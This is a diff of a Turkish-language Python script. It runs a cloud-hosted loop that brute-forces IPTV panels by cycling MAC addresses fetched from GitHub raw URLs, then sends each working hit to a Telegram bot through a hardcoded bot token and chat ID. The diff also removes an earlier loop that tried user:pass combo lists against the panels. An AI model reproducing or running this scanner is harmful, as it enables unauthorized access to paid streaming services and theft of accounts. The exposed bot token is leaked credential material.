@@ -1,7 +1,6 @@
 import os
 import time
 import threading
-import glob
 import requests
 from flask import Flask
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -13,12 +12,12 @@ app = Flask('')
 
 @app.route('/')
 def home():
-    return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"
+    return "Otonom IPTV Tarayıcı Aktif ve Bulutta Çalışıyor!"
 
 def run_web():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
-# --- TELEGRAM AYARLARI ---
+# --- TELEGRAM BİLDİRİM AYARLARI ---
 TOKEN = "9296501081:AAGTNmvWB8Qn8-kVxGNoJcC8LXTLb8lnZ94"
 CHAT_ID = "39743305"
 
@@ -63,7 +62,7 @@ def mac_tara(panel, mac):
             mesaj = (
                 f"🔥 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
                 f"🌐 <b>Panel:</b> http://{panel}\n"
-                f"💻 <b>MAC:</b> <code>{mac}</code>"
+                f"🎯 <b>MAC:</b> <code>{mac}</code>"
             )
             telegrama_gonder(mesaj)
             return True
@@ -72,65 +71,53 @@ def mac_tara(panel, mac):
     return False
 
 def arka_plan_tarayici():
-    print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
+    print("[*] Bulut Otonom Tarayıcı Başlatıldı ve GitHub Verileri Bekleniyor...")
+    
+    # GitHub Raw Linklerin Doğrudan Entegre Edilmiş Hali
+    MAC_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/Telegram_Nirvana_Pro/02_Mac_Dosyalari/saf_001a79_maclar.txt"
+    PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/Telegram_Nirvana_Pro/06_Bulunan_Paneller/benzersiz_paneller.txt"
     
     while True:
         try:
-            print("[i] Tarama turu başlıyor, klasörler taranıyor...")
+            print("[i] GitHub'dan güncel veriler çekiliyor...")
             
-            # 1. Klasörlerdeki tüm dosyaları otomatik bul (Parçalı dosyalar dahil)
-            combo_dosyalari = glob.glob(os.path.join("combo", "*.txt"))
-            mac_dosyalari = glob.glob(os.path.join("mac_list", "*.txt"))
-            panel_dosyalari = glob.glob(os.path.join("panel_list", "*.txt"))
-            
-            # Panelleri oku
-            paneller = []
-            for p_dosya in panel_dosyalari:
-                with open(p_dosya, "r", encoding="utf-8", errors="ignore") as f:
-                    for satir in f:
-                        p = satir.strip()
-                        if p and p not in paneller:
-                            paneller.append(p)
-            
-            # Macleri oku
             maclar = []
-            for m_dosya in mac_dosyalari:
-                with open(m_dosya, "r", encoding="utf-8", errors="ignore") as f:
-                    for satir in f:
-                        m = satir.strip()
-                        if m and m not in maclar:
-                            maclar.append(m)
+            try:
+                r_mac = requests.get(MAC_RAW_URL, timeout=10)
+                if r_mac.status_code == 200:
+                    maclar = [m.strip() for m in r_mac.text.splitlines() if m.strip()]
+                    print(f"[+] GitHub'dan {len(maclar)} adet saf MAC yüklendi.")
+            except Exception as e:
+                print(f"[!] MAC'ler çekilemedi: {e}")
 
-            print(f"[i] Toplam {len(paneller)} panel, {len(maclar)} MAC ve {len(combo_dosyalari)} adet combo dosyası yüklendi.")
+            paneller = []
+            try:
+                r_panel = requests.get(PANEL_RAW_URL, timeout=10)
+                if r_panel.status_code == 200:
+                    paneller = [p.strip().replace('http://', '').replace('https://', '') for p in r_panel.text.splitlines() if p.strip()]
+                    print(f"[+] GitHub'dan {len(paneller)} adet panel yüklendi.")
+            except Exception as e:
+                print(f"[!] Paneller çekilemedi: {e}")
 
-            # 2. MAC Taraması Örneği
+            if not paneller or not maclar:
+                print("[!] Uyarı: GitHub'dan yeterli veri alınamadı, 5 dakika sonra tekrar denenecek...")
+                time.sleep(300)
+                continue
+
+            # MAC Taramaları
             for panel in paneller:
                 for mac in maclar:
                     mac_tara(panel, mac)
+                    time.sleep(0.5)
 
-            # 3. Combo (Combo: user:pass) Taraması Örneği
-            for combo_dosya in combo_dosyalari:
-                print(f"[i] İşlenen combo dosyası: {os.path.basename(combo_dosya)}")
-                with open(combo_dosya, "r", encoding="utf-8", errors="ignore") as f:
-                    for satir in f:
-                        parca = satir.strip().split(':')
-                        if len(parca) >= 2:
-                            user = parca[0]
-                            pas = parca[1]
-                            for panel in paneller:
-                                m3u_tara(panel, user, pas)
+            print("[i] Tur tamamlandı, 15 dakika sonra tekrar taranacak...")
+            time.sleep(900)
 
-            print("[i] Tarama turu tamamlandı, 30 dakika bekleniyor...")
-            time.sleep(1800)  # 30 dk bekleme
-            
         except Exception as e:
-            print(f"[!] Hata: {e}")
+            print(f"[!] Döngü Hatası: {e}")
             time.sleep(60)
 
 if __name__ == '__main__':
-    # Flask sunucusunu ayrı bir thread'de (arkada) çalıştır
     t = threading.Thread(target=run_web)
     t.start()
-        
-    # Tarayıcı döngüsünü başlat
     arka_plan_tarayici()
